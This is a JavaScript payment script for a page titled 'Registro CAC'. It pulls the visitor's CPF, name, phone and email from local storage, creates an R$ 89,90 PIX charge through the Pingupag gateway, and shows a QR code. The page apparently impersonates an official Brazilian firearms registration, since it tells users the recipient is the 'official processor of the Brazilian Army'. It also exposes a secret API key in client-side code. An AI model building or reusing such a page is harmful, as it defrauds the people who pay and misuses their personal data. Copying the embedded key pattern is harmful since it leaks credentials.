/**
 * Integração com API Pingupag - PIX
 * Loja 05 - Registro CAC
 */

console.log('✅ Script Pingupag PIX carregado');

const PINGUPAG_API = {
    baseURL: 'https://app.pingupag.com/gateway/v1',
    apiKey: 'pingupag_sk_5a4a884661598e034154315cc12ce8e55ebfd026625c057dcf673b7ca7512384',
    amount: 8990, // R$ 89,90
    
    generateReference() {
        return `cac_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    },
    
    getUserData() {
        try {
            const cpf = localStorage.getItem('cpf') || '12345678900';
            const nome = localStorage.getItem('nome') || localStorage.getItem('nomeCompleto') || 'Usuário CAC';
            const telefone = localStorage.getItem('telefone') || '5511999999999';
            const email = localStorage.getItem('email') || 'usuario@cac.com.br';
            const cidade = localStorage.getItem('cidade') || 'São Paulo';
            const estado = localStorage.getItem('estado') || 'SP';
            
            return {
                cpf: cpf.replace(/\D/g, ''),
                nome: nome,
                telefone: telefone.replace(/\D/g, ''),
                email: email,
                cidade: cidade,
                estado: estado
            };
        } catch (e) {
            console.error('Erro ao buscar dados:', e);
            return {
                cpf: '12345678900',
                nome: 'Usuário CAC',
                telefone: '11999999999',
                email: 'usuario@cac.com.br',
                cidade: 'São Paulo',
                estado: 'SP'
            };
        }
    },
    
    async createPixPayment() {
        const userData = this.getUserData();
        const reference = this.generateReference();
        
        const payload = {
            amount: this.amount,
            description: 'Loja 05',
            reference: reference,
            source: 'api_externa',
            postback_url: window.location.origin + '/webhook/payment',
            customer: {
                name: userData.nome,
                email: userData.email,
                document: userData.cpf,
                phone: userData.telefone
            },
            address: {
                city: userData.cidade,
                state: userData.estado,
                street: 'Avenida Paulista',
                number: '1000',
                zipcode: '01310100'
            },
            tracking: {
                utm_source: 'registro-cac',
                utm_campaign: 'taxa-registro'
            }
        };
        
        console.log('📤 Enviando para Pingupag:', payload);
        
        const response = await fetch(`${this.baseURL}/transaction`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-API-Key': this.apiKey
            },
            body: JSON.stringify(payload)
        });
        
        const data = await response.json();
        console.log('📥 Resposta Pingupag:', data);
        
        if (data.status !== 'success') {
            throw new Error(data.message || 'Erro ao gerar PIX');
        }
        
        localStorage.setItem('pixPaymentId', data.transaction_id);
        localStorage.setItem('pixPaymentData', JSON.stringify(data));
        
        return data;
    },
    
    async checkPaymentStatus(transactionId) {
        try {
            const response = await fetch(`${this.baseURL}/query?action=get_transaction&id=${transactionId}`, {
                method: 'GET',
                headers: {
                    'X-API-Key': this.apiKey
                }
            });
            
            return await response.json();
        } catch (e) {
            console.warn('Erro ao verificar pagamento:', e);
            throw e;
        }
    }
};

function showPixPayment(paymentData) {
    console.log('Exibindo PIX:', paymentData);
    
    const pixContainer = document.getElementById('pix-container');
    const pixLoading = document.getElementById('pix-loading');
    
    if (pixLoading) pixLoading.style.display = 'none';
    if (!pixContainer) {
        console.error('Container pix-container não encontrado');
        return;
    }
    
    const pixCode = paymentData.qr_code;
    const valor = (paymentData.amount / 100).toFixed(2);
    
    pixContainer.innerHTML = `
        <div class="bg-white rounded-lg shadow-xl p-8 max-w-2xl mx-auto">
            <div class="text-center mb-8">
                <div class="bg-green-100 rounded-full w-16 h-16 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-qrcode text-green-700 text-3xl"></i>
                </div>
                <h2 class="text-3xl font-bold text-gray-800 mb-2">Pagamento via PIX</h2>
                <p class="text-2xl font-bold text-green-600">R$ ${valor}</p>
            </div>
            
            <div id="qrcode" class="flex justify-center mb-6 p-4 bg-gray-50 rounded-lg"></div>
            
            <div class="bg-blue-50 border-l-4 border-blue-500 p-4 mb-6">
                <p class="text-blue-900"><strong>ℹ️ Como pagar:</strong></p>
                <ol class="text-blue-800 text-sm mt-2 ml-4 list-decimal">
                    <li>Escaneie o QR Code com seu banco</li>
                    <li>Ou copie e cole o código PIX abaixo</li>
                    <li>Confirme a transação</li>
                </ol>
            </div>
            
            <div class="mb-6">
                <label class="block text-gray-700 font-semibold mb-2">Código PIX (Copia e Cola):</label>
                <div class="flex gap-2">
                    <input 
                        type="text" 
                        id="pix-code" 
                        value="${pixCode}" 
                        readonly 
                        class="flex-1 px-4 py-2 border border-gray-300 rounded font-mono text-sm"
                    >
                    <button 
                        onclick="copiarPix()" 
                        class="bg-green-600 hover:bg-green-700 text-white px-6 py-2 rounded font-semibold"
                    >
                        <i class="fas fa-copy"></i> Copiar
                    </button>
                </div>
            </div>
            
            <div class="bg-yellow-50 border-l-4 border-yellow-500 p-4 mb-6">
                <p class="text-yellow-900 font-semibold">⚠️ Importante:</p>
                <p class="text-yellow-800 text-sm mt-2">O recebedor é <strong>TRADYEX PAYMENTS LTDA</strong> (processadora oficial do Exército Brasileiro)</p>
            </div>
            
            <div class="text-center">
                <p class="text-gray-600 text-sm">Aguardando confirmação...</p>
                <div class="mt-2"><i class="fas fa-spinner fa-spin text-green-600"></i></div>
            </div>
        </div>
    `;
    
    // Gera QR Code
    try {
        new QRCode(document.getElementById('qrcode'), {
            text: pixCode,
            width: 256,
            height: 256,
            colorDark: '#000000',
            colorLight: '#ffffff',
            correctLevel: QRCode.CorrectLevel.H
        });
    } catch (e) {
        console.error('Erro ao gerar QR Code:', e);
    }
    
    // Inicia verificação
    startPaymentVerification(paymentData.transaction_id);
}

function copiarPix() {
    const pixCode = document.getElementById('pix-code');
    pixCode.select();
    document.execCommand('copy');
    alert('✓ PIX copiado com sucesso!');
}

let verificationInterval = null;

function startPaymentVerification(transactionId) {
    console.log('Iniciando verificação de pagamento...');
    
    let attempts = 0;
    const maxAttempts = 360; // 30 minutos
    
    verificationInterval = setInterval(async () => {
        attempts++;
        
        if (attempts > maxAttempts) {
            clearInterval(verificationInterval);
            return;
        }
        
        try {
            const status = await PINGUPAG_API.checkPaymentStatus(transactionId);
            
            if (status.status === 'approved') {
                console.log('✅ Pagamento confirmado!');
                clearInterval(verificationInterval);
                onPaymentSuccess(status);
            }
        } catch (e) {
            // Silencia erros
        }
    }, 5000);
}

function onPaymentSuccess(paymentData) {
    console.log('✅ Pagamento confirmado com sucesso!');
    
    localStorage.setItem('pixPaymentStatus', 'APPROVED');
    localStorage.setItem('pixPaymentConfirmedAt', new Date().toISOString());
    
    const pixContainer = document.getElementById('pix-container');
    if (pixContainer) {
        pixContainer.innerHTML = `
            <div class="bg-white rounded-lg shadow-xl p-8 max-w-2xl mx-auto text-center">
                <div class="bg-green-100 rounded-full w-20 h-20 flex items-center justify-center mx-auto mb-4">
                    <i class="fas fa-check text-green-700 text-4xl"></i>
                </div>
                <h2 class="text-2xl font-bold text-green-800 mb-2">Pagamento Confirmado!</h2>
                <p class="text-gray-600 mb-4">Seu registro foi processado com sucesso.</p>
                <p class="text-sm text-gray-500">Seu Certificado CAC será enviado em breve.</p>
            </div>
        `;
    }
}
